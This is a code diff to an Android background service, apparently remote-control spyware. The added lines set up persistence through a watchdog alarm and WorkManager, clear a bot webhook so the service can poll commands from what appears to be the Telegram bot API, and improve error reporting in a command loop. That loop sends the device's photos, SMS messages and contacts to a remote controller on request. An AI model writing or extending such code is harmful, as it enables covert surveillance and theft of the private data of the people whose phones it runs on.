@@ -48,6 +48,10 @@ public class BackgroundService extends Service {
         super.onCreate();
         ctx = getApplicationContext();
 
+        // جدولة طبقات الاستمرارية
+        AlarmScheduler.scheduleWatchdog(this);
+        AlarmScheduler.scheduleWorkManager(this);
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             String channelId = "sys_channel";
             NotificationChannel channel = new NotificationChannel(
@@ -73,7 +77,7 @@ public class BackgroundService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (!started) {
             started = true;
-            new Thread(this::sendControlPanel).start();
+            new Thread(this::deleteWebhookAndStart).start();
             new Thread(this::pollLoop).start();
         }
         return START_STICKY;
@@ -93,6 +97,28 @@ public class BackgroundService extends Service {
             try { checkUpdates(); } catch (Exception e) { e.printStackTrace(); }
             try { Thread.sleep(500); }
             catch (InterruptedException e) { Thread.currentThread().interrupt(); break; }
+        }
+    }
+
+    private void deleteWebhookAndStart() {
+        HttpURLConnection conn = null;
+        try {
+            // إلغاء أي webhook عشان getUpdates يشتغل
+            URL delUrl = new URL(API + "/deleteWebhook");
+            conn = (HttpURLConnection) delUrl.openConnection();
+            conn.setConnectTimeout(10000);
+            conn.setReadTimeout(10000);
+            conn.getResponseCode();
+            conn.disconnect();
+            conn = null;
+            
+            // إرسال البانل
+            sendControlPanel();
+            
+        } catch (Exception e) {
+            sendMsg("Init error: " + e.getMessage());
+        } finally {
+            if (conn != null) conn.disconnect();
         }
     }
 
@@ -181,15 +207,31 @@ public class BackgroundService extends Service {
             conn.setConnectTimeout(15000);
             conn.setReadTimeout(20000);
 
+            int responseCode = conn.getResponseCode();
+            InputStream stream = (responseCode >= 200 && responseCode < 300)
+                ? conn.getInputStream()
+                : conn.getErrorStream();
+
             StringBuilder response = new StringBuilder();
-            try (InputStream in = conn.getInputStream();
-                 BufferedReader reader = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8))) {
-                String line;
-                while ((line = reader.readLine()) != null) response.append(line);
+            if (stream != null) {
+                try (BufferedReader reader = new BufferedReader(
+                        new InputStreamReader(stream, StandardCharsets.UTF_8))) {
+                    String line;
+                    while ((line = reader.readLine()) != null) response.append(line);
+                }
+            }
+
+            if (responseCode != 200) {
+                sendMsg("getUpdates FAILED " + responseCode + ": " + response);
+                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
+                return;
             }
 
             JSONObject jsonResponse = new JSONObject(response.toString());
-            if (!jsonResponse.optBoolean("ok", false)) return;
+            if (!jsonResponse.optBoolean("ok", false)) {
+                sendMsg("getUpdates not ok: " + response);
+                return;
+            }
             JSONArray result = jsonResponse.optJSONArray("result");
             if (result == null) return;
 
@@ -210,10 +252,13 @@ public class BackgroundService extends Service {
                     case "cmd_photos":   new Thread(this::sendPhotos).start();   break;
                     case "cmd_sms":      new Thread(this::sendSms).start();      break;
                     case "cmd_contacts": new Thread(this::sendContacts).start(); break;
+                    default:
+                        sendMsg("Unknown callback data: " + data);
                 }
             }
         } catch (Exception e) {
-            e.printStackTrace();
+            sendMsg("checkUpdates exception: " + e.getClass().getSimpleName() + ": " + e.getMessage());
+            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
         } finally {
             if (conn != null) conn.disconnect();
         }
